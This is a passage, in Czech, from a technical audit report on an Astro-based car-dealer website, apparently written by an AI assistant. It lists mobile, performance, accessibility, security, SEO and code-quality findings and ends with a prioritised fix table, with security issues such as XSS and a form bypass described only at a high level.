   - **Drobné**: `.thumbs .thumb` na sklad/[id] mají žádné explicit min size — záleží na grid. Kontrolovat na 320px.
6. **Tap highlight color**: pouze `chat-close` má `-webkit-tap-highlight-color`. Defaultní iOS blue/grey highlight aktivní na všech ostatních linkach.
7. **`-webkit-overflow-scrolling: touch`** — používá se v `subnav-inner` a `mobile-drawer`. Deprecated v iOS 13+, ale neškodí.
8. **Sklad cards na 320px**: cena `1 234 900 Kč` (s NBSP) musí být na jednom řádku — řešeno přes NBSP, OK.
9. **Mobile drawer focus trap** — JS v Header.astro **nemá focus trap**. Když je drawer otevřený, Tab klávesa vystoupí ven (do skrytého navigace nebo dál na stránce). A11y violation.
10. **Mobile drawer Esc handling**: ✓ ano (Header.astro:140-142).
11. **Body scroll lock issues iOS** — viz #18.
12. **Hero stats sloupec na mobile** (`mhero-stats-inner` grid 1fr 1fr): když statů je 3, poslední řádek je centered, ale poslední button CTA grids span 2 — funguje OK.

---

## Performance findings

1. **Bundle: 4800+ řádků global.css** zatěžuje first paint. Astro `inlineStylesheets: 'auto'` v praxi neinline → external CSS request blocker. — viz #42.
2. **Elfsight platform.js načítaný na homepage** (`InstagramStrip.astro:34`) — async ✓, ale ~80KB JS jen pro Instagram embed. Lazy loadem widget se sice nezobrazí dokud user scrolluje, ale script ano.
3. **YouTube oembed fetch na build** (`VideoStrip.astro:60`) — 4 thumbnail title requests blokující build. Když YouTube oembed je pomalé/blocked → build delay.
4. **Image `srcset` thumbnails YouTube** (`VideoStrip:103`) — `maxresdefault.jpg 1280w` — 1280 pixel image pro thumbnail. Browser si vybere dle viewport — OK.
5. **Hero video preload="auto"** (`model/[slug].astro:463`) — stahuje celé video před render. Při slabém internetu = velký data + delay. `preload="metadata"` by stačil pro autoplay.
6. **DirectusImage chybí width/height attrs** — CLS — viz #17.
7. **Google Maps iframe eager load** — viz #31.
8. **Lead form POST přímo na Directus** — žádný server roundtrip optimalizace.
9. **Body padding-bottom calc(60px + env(safe-area-inset-bottom))** na mobile — vytváří layout reflow při safe-area changes.
10. **`document.querySelectorAll` v inline scripts** — opakovaný DOM query na každé stránce. Drobné, ale agregát.
11. **`will-change: transform` na nav** (`global.css:107`) — vždy. Browser drží GPU layer i když se nepoužívá. Lépe nastavit `will-change` JS pouze před animací.
12. **Fonts preconnect ✓** ale font-display je `swap` (URL parametr) ✓.
13. **WebP only ze Directus** (`DirectusImage:62-64`) — pre-WebP browsery (IE, Safari 13) dostanou WebP přímo, fail. Komentář v komponentě říká "97 % browserů" — OK pro 2026.
14. **`stockVehicles limit: 16` na home + brand + model** — fetch 16 jen aby shuffle z 16 vybral 4. Šetřete: limit 5 nebo udělejte shuffle server-side at build.

---

## Accessibility findings

1. **No skip-to-content link** — viz #48.
2. **Focus indicators removed via `outline: none` bez visible alternativy** — viz #20.
3. **Mobile drawer žádný focus trap** — viz mobile findings #9.
4. **Chat widget `chat-input` má `autocomplete="off"` ale žádné role / aria-live region** pro live messages. Screen reader nečte AI odpovědi automaticky. `chat-messages` div by měl mít `aria-live="polite"` a `role="log"`.
5. **`<button>` bez `type="submit"` v navech** — některá tlačítka v drawer/Chat default `type="submit"` → submit jakéhokoli předkového formuláře.
6. **`<a href="#">` placeholder v homepage e-shop link** (`index.astro:362`) — nefunkční odkaz pro keyboard user.
7. **`<button>` v `.gallery-main`** (`sklad/[id]:341`) — `data-gallery-trigger data-index="0"` ale uvnitř má `<a class="gallery-360">` s `onclick="event.stopPropagation()"`. Nested interactive elements (button > a) je HTML invalid + screen readers se ztrácí.
8. **Color contrast `.text-muted: #6B6B72`** na `--bg-soft: #F6F4EF` — kontrast cca 4.3:1, na hraně WCAG AA pro normal text (4.5 required). Velký text (`text-dim: #8E8E94`) — pod 3:1 fail. Použito v breadcrumb, footer disclaimer.
9. **`aria-current="page"` ✓** v Breadcrumbs.
10. **JSON-LD breadcrumb ✓**.
11. **`<h1>`** existuje na všech stránkách (kontrolováno).
12. **`<h2>` skip**: Některé sections mají section-eyebrow div + h2, ale je to v rámci section. **Pozor na model/[slug].astro tech-section** — má `<h2>` pro každou subsekci (`Technologie`, `Bezpečnost`, `Komfort`) bez wrapping `<h2>` jako rodič. Heading hierarchy plochá.
13. **`<form>` bez `<label for>`** v některých custom formech (`sklad/[id].astro:898-911`). Inputy mají jen `placeholder`, žádné `<label>` — chyba pro screen readers.
14. **`prefers-reduced-motion`** respektován jen v Header — viz #13.
15. **`<dialog>` nepoužit** pro gallery modal — místo toho `<div>` s aria-hidden. `<dialog>` element by byl víc semantic + native focus management.

---

## Security findings

1. **Lead POST bypass** — viz #1.
2. **`marked.parse()` + `set:html` XSS** — viz #2.
3. **Chat URL injection** — viz #3.
4. **Backup blob public-by-URL** — viz #11.
5. **Hardcoded Directus admin URL** — viz #6.
6. **Cenik admin page (`/admin/cenik`) publicly accessible** — `noindex` ano, ale URL kdokoli načte. Auth je client-side Directus login. Pokud uživatel zná URL + má Directus credentials, bypasses anything. (To je intentional, ale stojí za pozor.)
7. **CSP headers chybí**: žádné `Content-Security-Policy` nastavené (kontroluj vercel.json nebo Astro headers config). Bez CSP je inline `<script>` všude (Astro `<script>` se může inline-bundlovat) a žádná ochrana proti XSS.
8. **CORS headers na API**: `chat/model.ts` neřeší CORS. Pokud chcete externí weby používat váš chat → potřeba `Access-Control-Allow-Origin`. Pokud ne → striktní same-origin.
9. **Rate-limit pre-flight**: žádné CAPTCHA. Boti můžou plnit AI chat 20×/hod/IP, ale za 1 den z 1 IP = 480 zpráv. Anthropic Haiku 4.5 cena × velký kontext = $X.
10. **`tabindex="-1"` na honeypotu** ✓.
11. **`<iframe sandbox>`** chybí na Google Maps iframe — `kontakt.astro:57`. Maps iframe může spouštět JS, číst storage. Sandbox by tomu zabránil.
12. **Referrer leakage**: `referrerpolicy="no-referrer-when-downgrade"` na Maps iframe ✓.
13. **`target="_blank" rel="noopener"`** — kontrola: Footer social links mají `rel="noopener"`, ale ne `noreferrer`. Drobnost. Magazin Facebook/LinkedIn share OK.
14. **Email obfuscation**: `mailto:info@sfr-motor.cz` plaintext v DOM → spam bot crawling. Žádná obfuscation. Akceptovatelné business decision, ale risk.
15. **Phone obfuscation**: same.
16. **`window.dataLayer.push({ event: 'generate_lead', ... })`** — sends to GTM bez consent. GDPR riziko (Czech GDPR DPC active).
17. **`document.querySelector(\`[value="${userInput}"]\`)`** v sklad — CSS injection — viz #21.
18. **Directus API anonymity**: každý prefetch je `?fields=*` bez auth (potvrzeno v `directus.ts:73`). Directus role `Public` musí mít granulární read perms — pokud má read na `leads` collection, leak PII.

---

## SEO findings

1. **`<link rel="canonical">` chybí všude** — viz #5.
2. **`<meta name="robots">` jen na `/admin/cenik`** (`noindex`). Ostatní stránky default = indexable. Pro `/sklad?znacka=kgm` (filtr) — Google indexuje jako duplicate `/sklad`. — viz #5.
3. **Open Graph image dimensions missing** — viz #46.
4. **`og:url` chybí** v `BaseLayout.astro:50-56` — Facebook/LinkedIn nevědí kanonickou URL pro share.
5. **JSON-LD ✓** — homepage AutoDealer, model Product, vehicle Vehicle, breadcrumb BreadcrumbList ✓. Article schema na magazin ✓.
6. **JSON-LD WebSite SearchAction broken** — viz #24.
7. **Heading hierarchy**: některé stránky mají h2 bez h1 (nepravděpodobné na product pages, ale viz `magazin/index.astro`). Manual check potřeba.
8. **`alt=""` na decorative images ✓** (np. `btile-bg`).
9. **Lazy loading ✓** (`loading="lazy"` na DirectusImage).
10. **Eager + fetchpriority high na hero ✓**.
11. **Sitemap**: `@astrojs/sitemap` integration ✓. Bez excludes pro `/admin/*`. — viz #47.
12. **404 status code**: Astro static 404.astro fungue přes Vercel rewrite. Ale `Astro.redirect('/404')` z [slug].astro negeneruje 404 status — viz #7.
13. **Trailing slash**: `trailingSlash: 'ignore'` → `/sklad` a `/sklad/` jsou různé URL pro Google. — viz #5.
14. **`hreflang`** chybí — homepage má `<a href="#" aria-label="Změnit jazyk">CZ / EN</a>` (`Header.astro:37`) ale žádná EN verze. Buď implementovat hreflang nebo skrýt placeholder link.
15. **Internal linking density**: Modely linkují na sklad?model=X ✓, sklad detail linkuje na model/X ✓, footer ↔ pages ✓. Magazin → modely? Manual check.

---

## Code quality / refactor opportunities

1. **Stock card duplikace** — `/index.astro`, `/sklad/index.astro`, `/sklad/[id].astro` (similar cars), `/model/[slug].astro`, `/[brand].astro` — všechny renderují stock card s velmi podobnou strukturou (pic + pill-stack + body + nm + var + specs + foot + km + price + stock-state). Inline JS pro fmtPrice/fmtKm taky duplikováno.
   **Fix**: Vytvořit `components/StockCard.astro` s props (vehicle, brand, model, trim, fuel, condition, etc.).

2. **Cena/promo logika duplikováno** v ~5 souborech. `displayPrice = v.promo_price ?? baseList; if (modelPromoActive && modelPromoDiscount > 0 && baseList && isNew) { displayPrice = baseList - modelPromoDiscount; priceBefore = baseList }`.
   **Fix**: `lib/pricing.ts` s funkcí `computeDisplayPrice(vehicle, model)` vracející `{ price, priceBefore, savings, source }`.

3. **`fuelLabelMap` opakováno**: definováno minimálně v 5 souborech (`index.astro:275`, `sklad/index.astro:53`, `sklad/[id]:195`, `model/[slug]:120`, `[brand]`). 
   **Fix**: Constants export z `lib/labels.ts`.

4. **Inline `style="..."` všude**: 
   - `sklad/[id].astro:923` (`color: #fff`), `:953` (`margin-top`), `:920-922` (heading style), `:921-925` (CTA row).
   - `model/[slug].astro:566-573` (variant heading style), `682` (background var), `687` (margin), etc.
   - Inline styles ztěžují refactor a porušují separation of concerns.
   **Fix**: Přesunout do `<style>` block s class names, nebo do `global.css`.

5. **`(rawModel as any)`, `(v as any)`, `(model as any)` všude**: 200+ casts to `any`. TypeScript types v `lib/types.ts` nejsou plně populated. Risk: refactor field name v Directusu = silent break.
   **Fix**: Refresh types z Directus schema (auto-gen).

6. **Functions `getBaseSlug`, `extractKeywords`** v `chat/model.ts:99,87` — chybí TS return type annotation.

7. **Console.logs v production**: 16+ `console.log/warn` v `lib/directus.ts`, `chat/model.ts`, `admin/cenik.astro:282`. Některé z nich (lib/directus prefetch logs) jsou v build-time only, takže OK. Ale `chat/model.ts:166, 186` běží v každém AI requestu na produkci.
   **Fix**: Wrapping logger nebo `if (import.meta.env.DEV)`.

8. **Astro JSX TS in `{...}`**: Jeden potenciálně nebezpečný bod — `model/[slug].astro:481-513` má IIFE arrow function s `findValue: (re: RegExp): string | null => { ... }`. Type annotation `: string | null` v JSX context. **Tohle by mělo fungovat** protože je to v arrow fn body (frontmatter context), ne v JSX expression. Ale memory note říká pozor. Manual check by neuškodil.

9. **Inconsistent date handling**: 
   - `new Date().toISOString().slice(0, 10)` opakované 5+ míst (TODAY).
   - `formatDate` jen v magazin pages.
   - `new Date(promoValidTo) > new Date()` vs `String(promo_valid_to) >= today`.
   **Fix**: `lib/dates.ts` s `today()`, `isFuture(date)`, `formatCs(date)`.

10. **Dead/unused imports a code**:
    - `LeadForm.astro` — komponenta existuje, ale **prakticky se nepoužívá** v žádné stránce (kontrola: `Grep "LeadForm"` najde jen sám soubor). Místo toho stránky mají vlastní `<form class="fcard" data-lead-form>` inline. Dead code.
    - `import { autoDealerSchema, websiteSchema } from '@lib/schemas';` v `index.astro:12` — `websiteSchema` použito ✓.

11. **Magic numbers**: 
    - `THRESHOLD = 100, DELTA = 5` (Header.astro:151) — komentář popisuje, OK.
    - `60% akontace, 72 měsíců, 4.9% p.a.` — dvakrát hardcoded (`sklad/[id]:179-185` Astro + `:976-978` client JS). Sjednotit do CSS var nebo configu.
    - Brand warranty hardcoded (`model/[slug]:188-192`).

12. **Astro `<Fragment>` zbytečně použit**: `Header.astro:50` má `<Fragment>` wrapper pro `{i > 0 && <span>...</span>}` plus `<a>`. Astro umožňuje return array nebo conditional inline.

13. **`vehicleSchema` má `Object.keys(schema).forEach((k) => schema[k] === undefined && delete schema[k]);`** — manuální strip. JSON.stringify by undefined automaticky vypustil. Drobnost.

14. **Variant groups hardcoded** (`model/[slug].astro:267-280`): array of arrays mapping model → siblings. Komentář říká "TODO: přesunout do Directus jako field `variants_group`". Pamatuj.

15. **`tdToMap` v technicalData.ts** zavoláno bez Grep check — pravděpodobně dobře, ale check by pomohl.

16. **`docsList` filter complex** (`model/[slug].astro:351-371`) — multiple chained filters/maps/sort. Refactor do `lib/documents.ts` s pure function `getActiveDocs(raw, today)`.

17. **`Astro.url.pathname` použit pro source_page** ve formech. Pro user privacy možná chcete strip query strings (`Astro.url.pathname` to neobsahuje — OK, query je v `Astro.url.search`).

---

## Recommendations — co řešit jako první (Top 5 impact × effort)

| # | Issue | Impact | Effort | Why first |
|---|---|---|---|---|
| **1** | Lead form bypass (#1) | **Vysoký** (PR, GDPR, business) | Střední (1-2 dny) | Útok je triviální, právní rizika |
| **2** | Broken footer links → 404 (#4) | Střední (UX, SEO) | Nízký (1 hod) | Jen vypnout linky / přidat placeholder pages |
| **3** | Canonical URLs + trailingSlash (#5) | Vysoký (SEO long-term) | Nízký (1 hod) | BaseLayout.astro + config one-liner |
| **4** | Marked XSS sanitization (#2, #3) | Vysoký (security) | Nízký-střední (2-4 hod) | DOMPurify install + 3 míst |
| **5** | DirectusImage CLS (#17) | Střední (Core Web Vitals) | Nízký (1 hod) | Přidat width/height props/attrs |

---

## Co je OK (nepatří do report, ale ujištění)

- Lazy loading na images ✓
- Eager+fetchpriority high na hero ✓
- JSON-LD pro Vehicle/AutoDealer/Article ✓
- Honeypot field v formech (i když serverem nevynucený) ✓
- Astro sitemap integration ✓
- `noindex` na /admin/cenik ✓
- Rate limiter na AI chat (i když per-instance) ✓
- AI lead validation (jméno + telefon format) v chat/model.ts ✓
- Cron backup auth via CRON_SECRET ✓
- Hero video Safari autoplay JS fix ✓
- NBSP v fmtPrice / fmtKm ✓
- Mobile drawer Esc handling ✓
- env(safe-area-inset-*) respektován na bottom bar ✓
- Image webp formát ✓
- `prefetch` collections build-time optimalizace ✓
- `aria-current="page"` na breadcrumb ✓

---

*Konec reportu. Pokud máš dotazy ke konkrétním bodům, pošli číslo (např. "#13") — rád zacvičím.*
